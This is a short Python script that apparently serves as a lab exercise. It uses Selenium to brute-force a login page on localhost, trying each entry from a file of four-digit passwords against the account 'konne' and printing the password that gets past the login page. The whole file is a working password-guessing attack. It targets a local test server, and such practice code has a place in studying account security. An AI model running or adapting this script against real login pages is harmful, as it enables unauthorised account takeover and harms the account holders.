from selenium import webdriver
from alive_progress import alive_bar

driver = webdriver.Firefox()
driver.get("http://127.0.0.1:5000/login")

def read_passwords(filename):
    password_list = []
    with open(filename, "r") as f:
        for line in f:
            password = line.strip()
            password_list.append(password)
        return password_list

file_path = '4digits.txt'
passwords = read_passwords(file_path)

for pw in passwords:
    u_field = driver.find_element('name', 'Username')
    p_field = driver.find_element('name', 'Password')
    login_button = driver.find_element('id', 'submit')

    user = 'konne'
    u_field.send_keys(user)

    p_field.send_keys(pw)

    login_button.click()

    get_source = driver.page_source

    if driver.title != "Login":
        print(f"Password is {pw}")
        break

driver.quit()
